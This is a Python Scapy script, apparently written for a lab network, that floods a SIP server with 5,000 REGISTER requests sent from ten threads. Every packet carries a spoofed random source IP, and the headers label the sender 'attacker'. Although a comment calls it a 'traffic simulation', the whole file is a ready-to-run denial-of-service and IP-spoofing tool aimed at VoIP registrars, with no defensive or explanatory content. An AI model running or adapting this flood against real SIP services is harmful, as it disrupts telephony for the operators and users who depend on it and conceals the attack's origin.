import random
import threading
from scapy.all import *

# SIP Server Info
sip_server_ip = "10.9.0.3"
sip_server_port = 5060  # Default SIP port

# Function to generate a random IP address
def generate_random_ip():
    return f"10.9.0.{random.randint(1, 254)}"

# Function to send a REGISTER SIP request
def send_sip_register():
    attacker_ip = generate_random_ip()

    sip_register = (
        f"REGISTER sip:{sip_server_ip} SIP/2.0\r\n"
        f"Via: SIP/2.0/UDP {attacker_ip}:5060;branch=z9hG4bK-111111\r\n"
        f"To: <sip:attacker@{attacker_ip}>\r\n"
        f"From: <sip:attacker@{attacker_ip}>;tag=1234\r\n"
        f"Call-ID: 111111@example.com\r\n"
        f"CSeq: 1 REGISTER\r\n"
        f"Contact: <sip:attacker@{attacker_ip}>\r\n"
        f"Expires: 3600\r\n"
        f"User-Agent: Scapy-SIP\r\n"
        f"Content-Length: 0\r\n\r\n"
    )

    packet = IP(src=attacker_ip, dst=sip_server_ip) / UDP(sport=random.randint(1024, 65535), dport=sip_server_port) / Raw(load=sip_register)
    
    send(packet, verbose=False)
    print(f"[*] Sent REGISTER request from {attacker_ip}")

# Function to run multiple threads for high request rate
def start_traffic(thread_count=10, requests_per_thread=500):
    threads = []
    for _ in range(thread_count):
        thread = threading.Thread(target=lambda: [send_sip_register() for _ in range(requests_per_thread)])
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

# Start traffic simulation
start_traffic(thread_count=10, requests_per_thread=500)  # 5000 total requests
